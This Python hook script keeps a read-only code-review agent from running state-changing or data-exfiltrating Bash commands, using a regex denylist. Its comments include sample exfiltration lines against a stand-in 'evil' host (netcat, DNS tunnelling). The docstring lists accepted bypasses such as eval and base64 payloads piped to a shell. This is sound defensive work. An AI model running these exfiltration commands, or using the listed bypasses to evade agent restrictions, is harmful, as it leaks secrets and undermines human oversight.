#!/usr/bin/env python3
"""PreToolUse guard — enforce read-only agents at the command level.

Shipped by the sde-agents PLUGIN and registered through `hooks/hooks.json`, which Claude
Code installs as a SESSION-WIDE PreToolUse hook. It therefore has to scope ITSELF: it
no-ops unless the calling agent is in GUARDED_AGENTS.

Why it cannot simply live on the agent, as it used to: a plugin-shipped agent's `hooks:`
frontmatter is SILENTLY IGNORED ("For security reasons, `hooks`, `mcpServers`, and
`permissionMode` are not supported for plugin-shipped agents" —
code.claude.com/docs/en/plugins-reference). Probed on CLI 2.1.200: a plugin agent's
frontmatter hook never fired, while a byte-identical hook on a project-scope agent did.
Leaving `hooks:` on the agent would read as armor and provide none, so validate_fleet.py
now rejects that key outright.

Claude Code pipes the pending tool call as JSON on stdin; this denies Bash commands that
CHANGE STATE (repo or system) so "read-only" is enforced, not merely promised. Read-only
inspection commands (git log/diff/status/show/blame, grep, test runners invoked
as `python -m unittest` / `pytest`, curl GET, redirect to /dev/null, etc.) pass
through untouched.

SCOPING CONTRACT (probed, not assumed): the stdin payload carries `agent_type` — namespaced
for a plugin agent (`sde-agents:code-reviewer`), bare for a project/user-scope one. THE MAIN
LOOP CARRIES NO `agent_type` KEY AT ALL, which is what makes a session-wide hook safe: the
user's own Bash can never match GUARDED_AGENTS and is never inspected. `agent_type` is
UNDOCUMENTED, so if it is ever renamed upstream the guard would silently stop guarding —
the exact silent-disarm failure this fleet already hardened against elsewhere. main() fails
CLOSED on that instead: see the contract canary there.

Honest boundary — this is NOT a sandbox. It is a denylist that blocks the COMMON
state-changing and data-egress VERBS for a COOPERATIVE agent; it is
defense-in-depth, not a security boundary. It cannot stop a determined adversary
who fully controls the command string (obfuscation, novel interpreters,
encodings, and new tools will always out-run a regex denylist). The LOAD-BEARING
control is OS-level least privilege (credentials and filesystem permissions that
physically cannot mutate what matters). Treat this guard as a speed-bump that
catches the obvious, not as the thing standing between an attacker and the
system.

Known residuals (ACCEPTED BY DESIGN — do not chase with more regex): a regex
denylist cannot fully parse shell, so a state-changing verb deliberately hidden
behind shell *evaluation* will pass — e.g. backtick command substitution
(``x=`git push` ``), a verb after a shell *keyword* the anchor doesn't enumerate
(`for r in *; do git push; done`), `eval "$cmd"`, or a base64/hex-decoded payload
piped to an interpreter. We match COMMAND-POSITION verbs (start of line / after a
separator / subshell opener / VAR=val / wrapper / a path to the binary), which
catches the forms a COOPERATIVE agent actually emits; we intentionally do not try
to out-parse an adversarial shell.

Decision transport: a deny is the permissionDecision JSON on stdout with exit EXIT_DENY (43);
an allow is empty stdout with exit EXIT_ALLOW (42). The distinctive codes are how the hook
tells THIS guard's answer from a stand-in interpreter that merely exits 0 — see the comment at
EXIT_ALLOW below. The hook shell string translates them back to the documented exit-0 contract
(https://code.claude.com/docs/en/hooks) before Claude Code sees anything.

Cross-platform: pure Python stdlib, no jq. `hooks/hooks.json` runs this from
`${CLAUDE_PLUGIN_ROOT}` — the plugin's installed copy, which by construction is NOT inside
the repository under review, so a repo cannot swap the guard out. That path guarantee is
what the old `install_reviewer_guard.py` existed to manufacture by hand; the plugin gives
it for free, so the installer is gone.

The hook cheaply pre-filters on the raw payload before spending a Python process, so an
ordinary main-loop Bash call costs one shell glob and never starts an interpreter. It does NOT
pre-probe interpreters; it trusts `command -v` to nominate candidates (python3, python, py) and
authenticates the ANSWER instead — anything that exits with neither EXIT_ALLOW nor EXIT_DENY,
including the Microsoft Store `python3` stub that wins the PATH lookup on Windows, is treated
as "not my guard" and the next candidate is tried, failing closed for the reviewer if none
answers correctly.

Covered by tests/test_readonly_guard.py (pure-stdlib, runs offline in CI).
"""
import json
import re
import sys

# The plugin name is the namespace Claude Code prepends to every component this plugin ships;
# it must equal `name` in .claude-plugin/plugin.json (validate_fleet.py enforces that).
PLUGIN_NAME = "sde-agents"
# Agents this guard applies to — the read-only agents that still hold Bash. Both the namespaced
# form (how a plugin agent identifies itself) and the bare form (project/user scope, and the dev
# loop) are guarded, so the guard cannot be sidestepped by installing the agent a different way.
# validate_fleet.py cross-checks this against agents/: hold Bash and you must be listed here.
GUARDED_AGENT_NAMES = frozenset({"code-reviewer"})
GUARDED_AGENTS = frozenset(
    {name for name in GUARDED_AGENT_NAMES}
    | {f"{PLUGIN_NAME}:{name}" for name in GUARDED_AGENT_NAMES}
)

# Leading-wrapper tolerance shared by the command-position anchors: an optional `sudo`, `env FOO=1`,
# `xargs`, `nice -n 10`, `time`, `nohup`, etc. before the real command. Without it, `sudo install ...` /
# `sudo vim ...` would slip past the position-anchored patterns below. Bounded to a single command via
# [^|;&] so it can't span a pipeline.
_WRAP = r"(?:(?:sudo|xargs|nice|env|time|command|nohup|setsid|stdbuf|ionice)\b[^|;&]*?\s)?"

# Command-position anchor: start of string or just after a pipe/sep, plus the wrapper tolerance.
_CMD = r"(?:^|[|;&]\s*)" + _WRAP

# Wider command-position anchor for verbs that commonly appear inside QUOTED SEARCH TEXT
# (`rg "rm -rf" docs/`, `grep "pip install" README.md` — routine review commands that must not be
# false-positive denied). Anchors on start-of-line, separators, AND subshell/substitution openers
# (`(`, `{`, backtick) so `$(rm …)`, `(rm …)` and `` `rm …` `` are still caught in command position,
# while the same verb as a mere argument (after `rg`/`grep`) passes. A verb inside a quoted string
# that ALSO contains a separator (`rg "x; rm -rf" …`) still trips this — accepted: regex cannot
# parse shell quoting, and that residual errs toward deny, matching the guard's posture.
_CMD_SUB = r"(?:^|[|;&(){}`]\s*)" + _WRAP

# Command-position anchor for INTERPRETERS. Like _CMD_SUB but also tolerates a leading `VAR=val`
# assignment run (`FOO=bar python3 -c …`) and an absolute/relative path to the binary
# (`/usr/bin/python3 -c …`). Requiring command position is what keeps a `.py`/`.sh` FILENAME in
# argument position (`… app.py | grep -e def`, `cat deploy.sh | grep -c x`) from colliding with the
# two-letter `py`/`sh` interpreter tokens — the whole false-positive class the bare `\b(py|sh)\b`
# form produced.
_INTERP = _CMD_SUB + r"(?:\w+=(?:\"[^\"]*\"|'[^']*'|\S+)\s+)*(?:\S*/)?"

# Git accepts GLOBAL options BETWEEN `git` and the subcommand (`git -C <path> push`, `git -c k=v commit`,
# `git --git-dir=… --work-tree=… add`, `git --no-pager reset`). Without tolerating that prefix, the verb
# anchor `\bgit\s+(push|commit|…)` is bypassed by the idiomatic, non-adversarial `git -C repo …` form.
# A global-option VALUE: a quoted string (which may contain spaces) or a bare whitespace-delimited token.
_VAL = r"(?:\"[^\"]*\"|'[^']*'|\S+)"
_GIT_PRE = (
    r"(?:(?:"
    r"-C\s+" + _VAL + r"|-c\s+" + _VAL + r"|"
    r"--git-dir(?:=" + _VAL + r"|\s+" + _VAL + r")|--work-tree(?:=" + _VAL + r"|\s+" + _VAL + r")|"
    r"--namespace(?:=" + _VAL + r"|\s+" + _VAL + r")|"
    r"--exec-path(?:=" + _VAL + r")?|--config-env=" + _VAL + r"|"
    r"-p|--paginate|--no-pager|--bare|--no-replace-objects|--literal-pathspecs|--no-optional-locks|"
    r"--(?:no-)?(?:glob|noglob|icase)-pathspecs"
    r")\s+)*"
)

# Command-position prefix for `git` itself. A bare `\bgit\s+<verb>` also matches a git verb that
# appears only as an ARGUMENT or search text (`grep "git push" file`) — a false-positive denial of a
# read. Require git in COMMAND position: start of string; after a separator/pipe or subshell/brace
# opener; after leading `VAR=val` assignments (`GIT_SSH_COMMAND=… git push` is a real idiom); after a
# sudo/env-style wrapper. `(?:\S*/)?` re-admits an absolute/relative path to the binary. The trailing
# write-verb list still gates it, so a git READ in any of these positions (`(git log)`) stays allowed.
_GIT_CMD = (
    r"(?:^|[|;&(){}])\s*"
    r"(?:\w+=\S+\s+)*"
    + _WRAP
    + r"(?:\S*/)?git\s+"
)

# State-changing command patterns — denied for read-only agents. Case-insensitive.
_DENY_PATTERNS = [
    # GitHub CLI writes: PR/issue/release/workflow/secrets/repo mutations
    r"\bgh\s+(pr|issue)\s+(create|edit|close|reopen|merge|ready|lock|unlock|comment|review)\b",
    r"\bgh\s+workflow\s+run\b",
    r"\bgh\s+run\s+(rerun|cancel|delete)\b",
    r"\bgh\s+(secret|variable)\s+(set|delete|remove)\b",
    r"\bgh\s+release\s+(create|delete|edit|upload)\b",
    r"\bgh\s+repo\s+(create|delete|fork|edit|rename|sync|archive|unarchive)\b",
    r"\bgh\s+api\b.*(-X\s*(POST|PUT|DELETE|PATCH)|--method[=\s]+(POST|PUT|DELETE|PATCH))",
    # git writes: history, remote, index, or worktree mutations. _GIT_CMD anchors git to command
    # position (no false positive when a git verb is only grep'd/echoed text); _GIT_PRE tolerates
    # git's global-option prefix so it can't bypass the verb anchor.
    _GIT_CMD + _GIT_PRE + r"(add|mv|rm|push|commit|reset|rebase|merge|cherry-pick|revert|clean|am|apply|"
    r"restore|checkout|switch|pull|fetch|gc|prune|init|update-ref|update-index|"
    r"symbolic-ref|filter-branch|format-patch|bundle|archive|send-email|replace|"
    r"stash\b(?!\s+(?:list|show)\b)|worktree\b(?!\s+list\b)|"
    r"notes\s+(?:--ref(?:=\S+|\s+\S+)\s+)?(?:add|append|copy|edit|remove|prune)|"
    r"remote\s+(?:add|rm|remove|set-url))\b",
    # `git branch`/`git tag` WRITE forms. A leading read selector (`-r`, `-a`, `-l`) must NOT exempt a
    # later mutating flag, so deny when a delete/rename/copy/force/create flag appears ANYWHERE, or when
    # the first token is a bare name (lightweight create). Pure listing/verify commands carry none of
    # these, so `git branch -a`, `git branch -r --contains X`, `git tag -l 'v*'`, `git tag -v x` pass.
    _GIT_CMD + _GIT_PRE + r"branch\b[^|;&]*\s(?:-[dDmMcCf]|"
    r"--(?:delete|move|copy|force|set-upstream-to|unset-upstream|track|no-track|edit-description)\b)",
    _GIT_CMD + _GIT_PRE + r"branch\s+(?!-)\S",
    _GIT_CMD + _GIT_PRE + r"tag\b[^|;&]*\s(?:-[adsfFmu]|"
    r"--(?:delete|annotate|sign|local-user|force|create-reflog)\b)",
    _GIT_CMD + _GIT_PRE + r"tag\s+(?!-)\S",
    # git config WRITE: a dotted key followed by a value, or an explicit write flag.
    # Reads (`--get`/`--list`) lack the trailing value, so they pass through.
    _GIT_CMD + _GIT_PRE + r"config\s+(?:--\S+\s+)*\S+\.\S+\s+\S",
    _GIT_CMD + _GIT_PRE + r"config\s+(--unset|--unset-all|--replace-all|--add|--rename-section|--remove-section)\b",
    # filesystem / process / service mutations — command-position anchored (via _CMD_SUB, which also
    # covers subshell/substitution openers) with an optional path prefix (`/bin/rm`), so the verb as
    # quoted search text (`rg "rm -rf" docs/`) is not a false positive but `$(rm …)` is still caught.
    _CMD_SUB + r"(?:\S*/)?(rm|rmdir|mv|cp|rsync|dd|truncate|shred|chmod|chown|chgrp|ln|mkfs|mkdir|touch)\b",
    # find's action flags execute or mutate: -delete removes, -exec/-execdir/-ok/-okdir run an
    # arbitrary command with find as the launcher (`find . -exec rm {} \;` would otherwise slip
    # past the command-position anchor above, since rm sits in argument position there).
    r"\bfind\b[^|;&]*\s-delete\b",
    r"\bfind\b[^|;&]*\s-(exec|execdir|ok|okdir)\b",
    # Archive extractors / patch appliers WRITE files, exactly like cp/mv above. Command-position
    # anchored so the verb as search text (`rg "tar xf" docs/`) is not a false positive, with the
    # obvious read-only sub-forms exempted: `patch --dry-run`, `tar t…`/list, `unzip -l/-t`,
    # `gunzip -c/-l/-t`. `tar` fires only when the mode token carries an extract/create flag.
    _CMD_SUB + r"(?:\S*/)?patch\b(?![^|;&]*--dry-run)",
    # tar writes in extract (x) or create (c) mode; the mode may be the classic first-token flag
    # cluster (`tar xzf`, `tar -xzf`, `tar czf`) OR a `-x`/`-c` flag AFTER other options
    # (`tar -C /tmp -xf …`, `tar --directory=/tmp -xf …`), OR a long-form mode word. List/verify
    # modes (`tar tf`, `tar --list`) carry no x/c in an option token and stay allowed.
    _CMD_SUB + r"(?:\S*/)?tar\b(?:"
    r"\s+-?[A-Za-z]*[xc]"
    r"|[^|;&]*?\s-[A-Za-z]*[xc]"
    r"|[^|;&]*?\s--(?:extract|create|append|update|delete)\b"
    r")",
    # unzip / gunzip / gzip WRITE by default; exempt the non-extracting read modes. The read flag
    # may sit inside a COMBINED short-option cluster (`unzip -lq`, `gunzip -ck`), so match the letter
    # anywhere in the cluster rather than requiring it to stand alone.
    _CMD_SUB + r"(?:\S*/)?unzip\b(?![^|;&]*\s-[A-Za-z]*[lt])",
    _CMD_SUB + r"(?:\S*/)?(?:gunzip|gzip)\b(?![^|;&]*\s-[A-Za-z]*[clt])",
    # GNU install copies/creates files; anchored to command position because 'install'
    # is also a common path component (e.g. `ls /opt/install`) and a package subcommand.
    _CMD + r"install\b",
    # interactive/line editors and awk are file writers (in command position to avoid grep'd-text false positives)
    _CMD + r"(vim|vi|nvim|nano|emacs|ex|pico|ed)\b",
    r"\b[gmn]?awk\b.*system\s*\(",
    # PowerShell mutations, for Windows shells behind the Bash tool name
    r"\b(Remove-Item|Move-Item|Copy-Item|New-Item|Set-Content|Add-Content|Out-File|"
    r"Set-Item|Clear-Item|Rename-Item|Set-ItemProperty|New-ItemProperty|Remove-ItemProperty|"
    r"Start-Service|Stop-Service|Restart-Service|Set-Service|Stop-Process|Start-Process)\b",
    # in-place file editors
    r"\bsed\s+(-[^\s]*i|--in-place)",
    r"\bperl\s+-[^\s]*i",
    # shell output redirection to a file (allow >/dev/null and fd-dup like 2>&1), and tee.
    # Target charset includes quotes so `awk '{print > "f"}'` is caught; tee is anchored to
    # command position so `ps aux | grep tee` (tee as search text) is not a false positive.
    # The (?<![-=]) look-behind keeps arrows like `->`/`=>` (common in greps, jq, commit
    # messages) from being misread as redirection — a real redirect is never preceded by - or =.
    r"(?<![-=])>>?\s*\|?\s*(?!&|/dev/null\b)[\"'~./$A-Za-z0-9_-]",
    r"(?:^|[|;&]\s*)tee\b",
    r"\b(kill|pkill|killall)\b",
    r"\b(systemctl|service)\s+(start|stop|restart|reload|enable|disable)\b",
    r"\b(shutdown|reboot|halt|poweroff)\b",
    # package / dependency installs (state change, out of scope for read-only review) —
    # command-position anchored like the filesystem rule, so `rg "pip install" docs/` (the verb as
    # search text) passes while a real install, including by absolute path, is blocked.
    _CMD_SUB + r"(?:\S*/)?(apt|apt-get|yum|dnf|zypper|pip|pip3|npm|pnpm|yarn|gem|brew|choco)\s+"
    r"(install|remove|uninstall|update|upgrade|add)\b",
    _CMD_SUB + r"(?:\S*/)?cargo\s+install\b",
    _CMD_SUB + r"(?:\S*/)?go\s+(install|get)\b",
    _CMD_SUB + r"(?:\S*/)?uv\s+pip\s+install\b",
    _CMD_SUB + r"(?:\S*/)?poetry\s+(add|install)\b",
    _CMD_SUB + r"(?:\S*/)?(apk\s+add|pacman\s+-S)\b",
    # HTTP writes, file downloads/uploads (these mutate the local FS or a remote)
    r"\bcurl\b.*(-X\s*(POST|PUT|DELETE|PATCH)|--request\s+(POST|PUT|DELETE|PATCH))",
    r"\bcurl\b.*(--data(-raw|-binary|-urlencode)?|--form|\s-d[\s'\"@=]|\s-F[\s'\"@=])",
    # curl flags are case-sensitive (-O/-o/-T differ), so scope these out of the IGNORECASE compile
    r"\bcurl\b.*(\s(?-i:-O)\b|\s--remote-name\b|\s(?-i:-o)\s+(?!/dev/null|-)|\s(?-i:-T)\s|\s--upload-file\b)",
    r"\bwget\b(?!.*(-O\s*-|-qO-|--output-document[= ]-))",  # wget writes a file unless piped to stdout
    r"\b(scp|sftp)\b",
    # crontab edits/loads (mutations); a bare `crontab -l` listing is read-only and passes.
    r"\bcrontab\s+(?!-l\b)\S",
    # --- Data-egress / exfiltration channels ------------------------------------------------
    # A read-only agent can read secrets; these stop it from shipping them out. Raw-socket
    # tools are a clean exfil channel with no read-only-review need (`curl -v https://host`
    # covers HTTP reachability). Command-position anchored, so `cat secret | nc evil 443`
    # is caught at the pipe too.
    _CMD + r"(nc|ncat|netcat|socat|telnet)\b",
    # HTTP egress that embeds command/process substitution — `curl "...?d=$(cat secret)"` or
    # a backtick/`<(...)`. Bounded to the curl/wget segment via [^|;&] so a downstream
    # `| grep $(...)` is NOT a false positive; plain GET health checks have no substitution.
    r"\b(curl|wget)\b[^|;&]*(\$\(|`|<\()",
    # DNS-tunnel exfil — dig/nslookup/host carrying substitution (`dig $(whoami).evil.com`).
    # Command-position anchored; plain lookups (`dig example.com`) still pass.
    _CMD + r"(dig|nslookup|host)\b[^|;&]*(\$\(|`|<\()",
    # Nested shells/interpreters are too easy to use as mutation bypasses. All anchored to command
    # position via _INTERP and bounded to a single segment ([^|;&]*) so a downstream `| grep -e x`
    # or a `.py`/`.sh` FILENAME argument is not mistaken for an inline-eval flag.
    # Shell interpreters: -c / /c / -Command run an inline command string.
    _INTERP + r"(bash|sh|zsh|pwsh|powershell|cmd)\b[^|;&]*\s(-c|/c|-Command|-File)\b",
    # Code interpreters: -c/-e/-E/-p/--eval/--print eval inline code — perl/ruby/node -e
    # are exact peers of python -c. A bare trailing `-` or a heredoc feeds a script on stdin.
    _INTERP + r"(python|python3|py|perl|ruby|node)\b[^|;&]*\s(-c|-e|-E|-p|--eval|--print)\b",
    _INTERP + r"(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\s+-(\s|$)",
    _INTERP + r"(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\b[^|;&]*<<-?\s*[\"']?\w",
    # An interpreter reading its script from STDIN redirection (`bash < deploy.sh`,
    # `python3 < mutate.py`, `sh -s < run.sh`) — this runs the file just like `bash deploy.sh` and
    # rides in even after a pipe (`curl … | bash < payload`). `<(?!<)` excludes the heredoc `<<`
    # (handled above); reading from /dev/null is a harmless no-op and stays allowed.
    _INTERP + r"(bash|sh|zsh|pwsh|powershell|cmd|python|python3|py|perl|ruby|node)\b[^|;&]*"
    r"<(?!<)\s*(?!/dev/null\b)[\"'./~$A-Za-z0-9_-]",
    # --- running local SCRIPTS / build & orchestration verbs --------------------------------
    # A read-only agent has no business executing arbitrary local scripts or kicking off
    # build/deploy/orchestration runners — these are open-ended state changes. Conservative on
    # purpose: only fire on forms that clearly RUN something, not on read-only sub-commands.
    _CMD + r"(make|docker|terraform|kubectl|ansible-playbook|npx|mvn|gradle)\b",
    # cargo/go run-or-build (install/get already covered above). Command-position anchored, so
    # observation-only text — `rg "go build" .` — is NOT a false positive; only an actual
    # `go build`/`cargo run` in the command slot is blocked. The `(?:\S*/)?` prefix also
    # catches an absolute-path toolchain: `/usr/local/go/bin/go build`.
    _CMD + r"(?:\S*/)?(go|cargo)\s+(run|build)\b",
    # An interpreter invoked on a script FILE (not an inline-code flag, not a read-only probe).
    # `bash deploy.sh`, `sh ./run.sh` — arg ending in .sh or a path. The optional `(?:\S*/)?`
    # prefix closes the absolute-path bypass: `/bin/bash deploy.sh` is treated identically.
    _CMD + r"(?:\S*/)?(bash|sh|zsh)\s+[\"'./~$A-Za-z0-9_-]*\S+\.sh\b",
    _CMD + r"(?:\S*/)?(bash|sh|zsh)\s+\.{0,2}/\S+",
    # `python3 ./mutate.py`, `node x.js|.mjs|.cjs`, `ruby x.rb` — a script-file argument.
    # The `-c/-e/--eval` and `--version`/`-m` forms are read-only probes and pass through.
    # The repo's own read-only validator is exempted up front via _ALLOW_RE.
    r"\b(python|python3|py)\s+(?!-)\S*\.py\b",
    r"\bnode\s+(?!-)\S*\.(js|mjs|cjs)\b",
    r"\bruby\s+(?!-)\S*\.rb\b",
    # `python -m py_compile`/`-m compileall` WRITE bytecode (.pyc) — not read-only. Use a pure-read
    # syntax check instead (e.g. `python3 -c` is blocked too; prefer reading the file).
    r"\bpy(thon3?)?\s+(?:-\S+\s+)*-m\s+(py_compile|compileall)\b",
    # Direct execution of a local file by RELATIVE path in command position: `./deploy.sh`,
    # `../bin/x`, `scripts/x.sh`. ABSOLUTE paths (`/bin/cat`) are NOT caught here — a read-only
    # binary invoked by absolute path is fine, and an absolute-path *mutating* command is still
    # caught by its verb rule (`/bin/rm` → `\brm\b`). Anchored to command position so a path
    # ARGUMENT (`cat path/to/file`) is not — `cat` holds the command slot there.
    r"(?:^|[|;&]\s*)[A-Za-z0-9_.~-]+/\S*",
    # An ABSOLUTE path to a SCRIPT FILE (by extension) in command position — `/tmp/x.sh`,
    # `/opt/app/deploy.py`. Absolute paths to BINARIES have no script extension and stay allowed.
    r"(?:^|[|;&]\s*)/\S*\.(sh|bash|zsh|py|rb|js|mjs|cjs|pl|ps1)\b",
    # Sourcing a file pulls its (possibly mutating) commands into the current shell.
    r"(?:^|[|;&]\s*)source\b",
    r"(?:^|[|;&]\s*)\.\s+\S",
    # A bare `sh`/`bash`/`zsh` at the END of a pipeline consumes a script on stdin
    # (`... | base64 -d | sh`) — no `-c` needed. Anchored to a pipe so it's the sink.
    r"\|\s*(sudo\s+)?(?:\S*/)?(sh|bash|zsh)\s*(\||$|;|&)",
]
# re.MULTILINE so the command-position anchor `^` matches at the start of EVERY line, not just the
# whole string — otherwise a state-changing verb on a later line of a multiline Bash command
# (`echo hi\ngit push`) would slip past every `(?:^|…)`-anchored rule. A newline is a command
# separator just like `;`.
_DENY_RE = re.compile("|".join(_DENY_PATTERNS), re.IGNORECASE | re.MULTILINE)

# Allowlist: the repo's own READ-ONLY fleet validator at its EXACT path — the one local script a
# reviewer legitimately runs. Pinned to `scripts/validate_fleet.py` (optional leading `./`) so an
# attacker-planted look-alike at a DIFFERENT path is NOT exempted. Anchored to the WHOLE command
# (optional interpreter, optional args) so a chained mutation like
# `python scripts/validate_fleet.py; rm -rf /` does NOT get a free pass. Args are restricted to a
# SAFE charset — no separators, no redirection (`>`), no command/process substitution (`$(`,
# backtick, `<(`), no quotes — so the exemption cannot smuggle a write past the denylist
# (`… --root . > out.txt`, `… --root $(rm -rf /)` fall through to the deny rules instead).
# Two flags are additionally rejected by name because they change what the validator DOES, not
# just what it reads: `--write-inventory` is its one write mode (also re-checked in main()), and
# `--root` makes validate_plugin() import and execute `<root>/scripts/readonly-guard.py` — with
# an attacker-chosen root, that is arbitrary code execution wearing the exemption. The reviewer
# never needs either: the default root is the validator's own repository.
_ALLOW_RE = re.compile(
    r"^(?!.*--root\b)\s*(?:python3?|py)\s+"
    r"(?:\./)?scripts/validate_fleet\.py"
    r"(?:\s+[A-Za-z0-9._/=,@\s-]*)?\s*$",
    re.IGNORECASE,
)

_REASON = (
    "Blocked: this is a read-only agent. The command appears to change state "
    "(git or GitHub write, file/process/service mutation, package install, nested shell, "
    "script execution, or an HTTP write) or to exfiltrate data (raw-socket tool, or HTTP/DNS "
    "egress carrying command substitution). Inspect with read commands (git diff/log/show/blame, "
    "grep, `python -m unittest`, plain curl GET); report a needed change as a finding for the "
    "author to apply — never apply it yourself."
)


# Exit codes AUTHENTICATE the guard's answer to the hook — they are not decoration.
#
# The hook must locate a Python at runtime (the plugin has no install step that could pin an
# absolute interpreter, and on Windows the Microsoft Store `python3` stub wins the PATH lookup).
# If the hook simply took "exit 0 + empty stdout" as ALLOW, then ANY binary named `python3` that
# exits 0 — a PATH-planted shim, the Store stub on a bad day — would be accepted as the guard and
# would silently allow every command. That is the silent-disarm failure this fleet exists to
# refuse. So an ALLOW must be positively asserted with a code no accidental or hostile stand-in
# produces, and the hook treats anything that is neither code as "this was not my guard" and moves
# to the next candidate interpreter, failing closed if none answers correctly.
EXIT_ALLOW = 42
EXIT_DENY = 43


def _allow() -> None:
    """Positively assert ALLOW (no stdout, distinctive exit code) and stop."""
    sys.exit(EXIT_ALLOW)


def _deny(reason: str) -> None:
    """Emit the deny decision on stdout and assert DENY via the exit code."""
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": reason,
        }
    }))
    sys.exit(EXIT_DENY)


def main() -> None:
    try:
        # Read raw bytes and decode with utf-8-sig so a leading BOM (which some Windows shells
        # and pipes prepend) is stripped reliably, regardless of the locale encoding.
        raw = sys.stdin.buffer.read().decode("utf-8-sig", errors="replace")
        data = json.loads(raw) if raw.strip() else {}
    except Exception:
        _allow()  # unparseable input -> don't interfere with the normal permission flow

    if data.get("tool_name") != "Bash":
        _allow()

    # This hook is registered SESSION-WIDE (a plugin cannot scope a PreToolUse hook to one of its
    # own agents), so the guard scopes itself. The main loop carries NO `agent_type` key, so the
    # user's own Bash exits here and is never inspected — that property is what makes a
    # session-wide read-only guard safe to ship at all.
    agent = data.get("agent_type")
    if agent not in GUARDED_AGENTS:
        # Contract canary. `agent_type` is undocumented. If it is renamed upstream, every payload
        # starts looking like the main loop and the guard would quietly stop guarding — precisely
        # the silent-disarm class of bug this fleet hardened against in validate_fleet.py. So when
        # the payload still identifies a guarded agent under some OTHER key, yet no `agent_type`
        # did, treat the contract as broken and fail CLOSED instead of waving the command through.
        #
        # The check is deliberately keyed, not a substring search over the envelope:
        #   * `tool_input` is excluded outright — the command is attacker- and user-controlled
        #     text, and scanning it would deny an ordinary main-session command that merely
        #     MENTIONS the agent (`git commit -m "fix sde-agents:code-reviewer"`).
        #   * only keys whose NAME contains "agent" are consulted, and only for exact GUARDED
        #     values. A rename keeps agent identity in an agent-ish key (`subagent_type`,
        #     `agentType`, ...), while `cwd`/`transcript_path` — which could legitimately contain
        #     an agent's name as a directory component — can never match on key name.
        # This covers BOTH spellings, so a bare-scope install (project/user level, where
        # agent_type is un-namespaced) fails closed too, not just the plugin scope. Residual: a
        # rename to a key without "agent" in it (e.g. `caller_type`) is not caught here — that is
        # what scripts/probe_plugin.py exists to catch after a CLI upgrade.
        if agent is None and any(
            "agent" in key.lower() and isinstance(value, str) and value in GUARDED_AGENTS
            for key, value in data.items()
            if key != "tool_input"
        ):
            _deny(
                "Blocked: the read-only guard could not identify the calling agent. The PreToolUse "
                "payload named a guarded agent but carried no 'agent_type' field, so the hook payload "
                "contract has changed. The guard fails closed rather than silently stop guarding. "
                "Re-run the fleet probe (see README, 'Verifying the plugin') and update "
                "GUARDED_AGENTS in scripts/readonly-guard.py."
            )
        _allow()

    command = (data.get("tool_input") or {}).get("command", "") or ""
    # The allowlist is a SINGLE-command exemption; require a single line so a multiline command
    # that merely STARTS with the validator can't ride the exemption past the (MULTILINE) denylist.
    if (
        "\n" not in command
        and "\r" not in command
        and "--write-inventory" not in command.lower()
        and _ALLOW_RE.match(command)
    ):
        _allow()  # the repo's own read-only validator — explicitly permitted
    if _DENY_RE.search(command):
        _deny(_REASON)
    _allow()


if __name__ == "__main__":
    main()
